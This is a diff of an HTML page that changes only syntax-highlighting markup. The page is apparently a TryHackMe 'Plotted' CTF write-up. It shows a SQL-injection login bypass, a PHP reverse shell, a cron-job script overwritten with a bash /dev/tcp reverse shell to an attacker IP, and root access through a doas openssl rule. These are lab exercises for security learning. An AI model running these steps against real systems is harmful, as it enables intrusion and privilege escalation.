@@ -66,98 +66,98 @@
             <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
         </header>
         <div class="markdown-content">
-            <pre class="codehilite"><code>PORT    STATE SERVICE REASON         VERSION
+            <div class="codehilite"><pre><span></span><code>PORT    STATE SERVICE REASON         VERSION
 22/tcp  open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp  open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
 445/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>http://10.66.179.166/passwd
+<div class="codehilite"><pre><span></span><code>http://10.66.179.166/passwd
 
 `bm90IHRoaXMgZWFzeSA6RA==`
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>http://10.66.179.166/admin/id_rsa
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="o">://</span><span class="mf">10.66.179.166</span><span class="o">/</span><span class="k">admin</span><span class="o">/</span><span class="n">id_rsa</span>
 
-`VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE`
-</code></pre>
+<span class="n n-Quoted">`VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE`</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>http://10.66.179.166:445/management/admin/login.php
-</code></pre>
+<div class="codehilite"><pre><span></span><code>http://10.66.179.166:445/management/admin/login.php
+</code></pre></div>
 
 <blockquote>
 <p>This login forum injectable i use <code>' or 1=1 -- -</code> and can be login and I add and run phpreverseshell</p>
 </blockquote>
-<pre class="codehilite"><code>www-data@plotted:/home/plot_admin$ cat user.txt
-cat: user.txt: Permission denied
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@plotted</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">plot_admin</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="nl">cat</span><span class="p">:</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="nl">txt</span><span class="p">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>www-data@plotted:/var/www/scripts$ cat /etc/crontab
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nv">@plotted:</span><span class="sr">/var/</span><span class="n">www</span><span class="sr">/scripts$ cat /</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
 
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
+<span class="c1"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+<span class="c1"># command to install the new version when you edit this file</span>
+<span class="c1"># and files in /etc/cron.d. These files also have username fields,</span>
+<span class="c1"># that none of the other crontabs do.</span>
 
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+<span class="n">SHELL</span><span class="o">=</span><span class="sr">/bin/s</span><span class="n">h</span>
+<span class="n">PATH</span><span class="o">=</span><span class="sr">/usr/</span><span class="nb">local</span><span class="sr">/sbin:/</span><span class="n">usr</span><span class="sr">/local/</span><span class="n">bin:</span><span class="sr">/sbin:/</span><span class="n">bin:</span><span class="sr">/usr/s</span><span class="n">bin:</span><span class="sr">/usr/</span><span class="n">bin</span>
 
-# Example of job definition:
-# .---------------- minute (0 - 59)
-# |  .------------- hour (0 - 23)
-# |  |  .---------- day of month (1 - 31)
-# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
-# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
-# |  |  |  |  |
-# *  *  *  *  * user-name command to be executed
-17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
-* *     * * *   plot_admin /var/www/scripts/backup.sh
-#
-</code></pre>
+<span class="c1"># Example of job definition:</span>
+<span class="c1"># .---------------- minute (0 - 59)</span>
+<span class="c1"># |  .------------- hour (0 - 23)</span>
+<span class="c1"># |  |  .---------- day of month (1 - 31)</span>
+<span class="c1"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+<span class="c1"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+<span class="c1"># |  |  |  |  |</span>
+<span class="c1"># *  *  *  *  * user-name command to be executed</span>
+<span class="mi">17</span><span class="w"> </span><span class="o">*</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">cd</span><span class="w"> </span><span class="sr">/ &amp;&amp; run-parts --report /</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">hourly</span>
+<span class="mi">25</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">daily</span><span class="w"> </span><span class="p">)</span>
+<span class="mi">47</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">7</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">weekly</span><span class="w"> </span><span class="p">)</span>
+<span class="mi">52</span><span class="w"> </span><span class="mi">6</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="sr">/usr/s</span><span class="n">bin</span><span class="sr">/anacron || ( cd /</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">run</span><span class="o">-</span><span class="n">parts</span><span class="w"> </span><span class="o">--</span><span class="n">report</span><span class="w"> </span><span class="sr">/etc/c</span><span class="n">ron</span><span class="o">.</span><span class="n">monthly</span><span class="w"> </span><span class="p">)</span>
+<span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">     </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">plot_admin</span><span class="w"> </span><span class="sr">/var/</span><span class="n">www</span><span class="sr">/scripts/</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="c1">#</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>www-data@plotted:/var/www/html/445/management$ cat initialize.php
-&lt;?php
-$dev_data = array('id'=&gt;'-1','firstname'=&gt;'Developer','lastname'=&gt;'','username'=&gt;'dev_oretnom','password'=&gt;'5da283a2d990e8d8512cf967df5bc0d0','last_login'=&gt;'','date_updated'=&gt;'','date_added'=&gt;'');
-if(!defined('base_url')) define('base_url','/management/');
-if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
-if(!defined('dev_data')) define('dev_data',$dev_data);
-if(!defined('DB_SERVER')) define('DB_SERVER',&quot;localhost&quot;);
-if(!defined('DB_USERNAME')) define('DB_USERNAME',&quot;tms_user&quot;);
-if(!defined('DB_PASSWORD')) define('DB_PASSWORD',&quot;Password@123&quot;);
-if(!defined('DB_NAME')) define('DB_NAME',&quot;tms_db&quot;);
-?&gt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">@</span><span class="n">plotted</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="mi">445</span><span class="o">/</span><span class="n">management$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">initialize</span><span class="p">.</span><span class="n">php</span>
+<span class="o">&lt;?</span><span class="n">php</span>
+<span class="n">$dev_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="err">&#39;</span><span class="kt">id</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="mi">-1</span><span class="sc">&#39;,&#39;</span><span class="n">firstname</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="n">Developer</span><span class="sc">&#39;,&#39;</span><span class="n">lastname</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="sc">&#39;,&#39;</span><span class="n">username</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="n">dev_oretnom</span><span class="sc">&#39;,&#39;</span><span class="n">password</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="mi">5</span><span class="n">da283a2d990e8d8512cf967df5bc0d0</span><span class="sc">&#39;,&#39;</span><span class="n">last_login</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="sc">&#39;,&#39;</span><span class="n">date_updated</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;</span><span class="sc">&#39;,&#39;</span><span class="n">date_added</span><span class="err">&#39;</span><span class="o">=&gt;</span><span class="err">&#39;&#39;</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">base_url</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">base_url</span><span class="sc">&#39;,&#39;</span><span class="o">/</span><span class="n">management</span><span class="o">/</span><span class="err">&#39;</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">base_app</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">base_app</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">str_replace</span><span class="p">(</span><span class="sc">&#39;\\&#39;</span><span class="p">,</span><span class="sc">&#39;/&#39;</span><span class="p">,</span><span class="n">__DIR__</span><span class="p">).</span><span class="sc">&#39;/&#39;</span><span class="w"> </span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">dev_data</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">dev_data</span><span class="err">&#39;</span><span class="p">,</span><span class="n">$dev_data</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_SERVER</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_SERVER</span><span class="err">&#39;</span><span class="p">,</span><span class="s">&quot;localhost&quot;</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_USERNAME</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_USERNAME</span><span class="err">&#39;</span><span class="p">,</span><span class="s">&quot;tms_user&quot;</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_PASSWORD</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_PASSWORD</span><span class="err">&#39;</span><span class="p">,</span><span class="s">&quot;Password@123&quot;</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_NAME</span><span class="err">&#39;</span><span class="p">))</span><span class="w"> </span><span class="n">define</span><span class="p">(</span><span class="err">&#39;</span><span class="n">DB_NAME</span><span class="err">&#39;</span><span class="p">,</span><span class="s">&quot;tms_db&quot;</span><span class="p">);</span>
+<span class="o">?&gt;</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>www-data@plotted:/var/www/scripts$ ls
-backup.sh
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>www-data@plotted:/var/www/scripts$ rm backup.sh
-rm: remove write-protected regular file 'backup.sh'? yes
-www-data@plotted:/var/www/scripts$ ls
-www-data@plotted:/var/www/scripts$ set +H
-www-data@plotted:/var/www/scripts$ echo '#!/bin/bash
-&gt; bash -i &gt;&amp; /dev/tcp/192.168.153.193/4444 0&gt;&amp;1' &gt; backup.sh
-www-data@plotted:/var/www/scripts$ chmod +x backup.sh
-www-data@plotted:/var/www/scripts$ ls -la
-total 12
-drwxr-xr-x 2 www-data www-data 4096 Dec 21 08:27 .
-drwxr-xr-x 4 root     root     4096 Oct 28  2021 ..
--rwxrwxrwx 1 www-data www-data   58 Dec 21 08:27 backup.sh
-www-data@plotted:/var/www/scripts$ ./backup.sh
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">rm</span><span class="p">:</span><span class="w"> </span><span class="n">remove</span><span class="w"> </span><span class="n">write</span><span class="o">-</span><span class="n">protected</span><span class="w"> </span><span class="n">regular</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="s1">&#39;backup.sh&#39;</span><span class="err">?</span><span class="w"> </span><span class="n">yes</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">+</span><span class="n">H</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">153.193</span><span class="o">/</span><span class="mi">4444</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="s1">&#39; &gt; backup.sh</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
+<span class="n">total</span><span class="w"> </span><span class="mi">12</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Dec</span><span class="w"> </span><span class="mi">21</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="o">.</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">     </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w"> </span><span class="mi">28</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="o">..</span>
+<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w">   </span><span class="mi">58</span><span class="w"> </span><span class="n">Dec</span><span class="w"> </span><span class="mi">21</span><span class="w"> </span><span class="mi">08</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">plotted</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">scripts</span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">backup</span><span class="o">.</span><span class="n">sh</span>
+</code></pre></div>
 
 <blockquote>
 <p>Wait Few Seconds...</p>
 </blockquote>
-<pre class="codehilite"><code>user.txt
-plot_admin@plotted:~$ cat user.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">plot_admin</span><span class="nv">@plotted</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
 
-<pre class="codehilite"><code>find / -user root -perm /4000
+<div class="codehilite"><pre><span></span><code>find / -user root -perm /4000
 /usr/bin/passwd
 /usr/bin/sudo
 /usr/bin/gpasswd
@@ -169,22 +169,22 @@ plot_admin@plotted:~$ cat user.txt
 /usr/bin/umount
 /usr/bin/doas
 /usr/bin/newgrp
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code> cat /etc/doas.conf 
-permit nopass plot_admin as root cmd openssl
-plot_admin@plotted:/$ LFILE=/etc/passwd
-&lt;sh” | doas -u root openssl enc -out “$LFILE”|
-&gt; ^C
-plot_admin@plotted:/$ doas openssl enc -in &quot;/root/root.txt&quot;
-Congratulations on completing this room!
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">doas</span><span class="p">.</span><span class="n">conf</span><span class="w"> </span>
+<span class="n">permit</span><span class="w"> </span><span class="n">nopass</span><span class="w"> </span><span class="n">plot_admin</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="n">openssl</span>
+<span class="n">plot_admin</span><span class="nv">@plotted</span><span class="err">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">LFILE</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">&lt;</span><span class="n">sh</span><span class="err">”</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">doas</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">enc</span><span class="w"> </span><span class="o">-</span><span class="k">out</span><span class="w"> </span><span class="err">“$</span><span class="n">LFILE</span><span class="err">”</span><span class="o">|</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="o">^</span><span class="n">C</span>
+<span class="n">plot_admin</span><span class="nv">@plotted</span><span class="err">:</span><span class="o">/</span><span class="err">$</span><span class="w"> </span><span class="n">doas</span><span class="w"> </span><span class="n">openssl</span><span class="w"> </span><span class="n">enc</span><span class="w"> </span><span class="o">-</span><span class="ow">in</span><span class="w"> </span><span class="ss">&quot;/root/root.txt&quot;</span>
+<span class="n">Congratulations</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">completing</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">room</span><span class="err">!</span>
 
-53f85e2da...............
+<span class="mi">53</span><span class="n">f85e2da</span><span class="p">...............</span>
 
-Hope you enjoyed the journey!
+<span class="n">Hope</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">enjoyed</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">journey</span><span class="err">!</span>
 
-Do let me know if you have any ideas/suggestions for future rooms.
-</code></pre>
+<span class="n">Do</span><span class="w"> </span><span class="n">let</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">ideas</span><span class="o">/</span><span class="n">suggestions</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">future</span><span class="w"> </span><span class="n">rooms</span><span class="p">.</span>
+</code></pre></div>
         </div>
     </article>
 
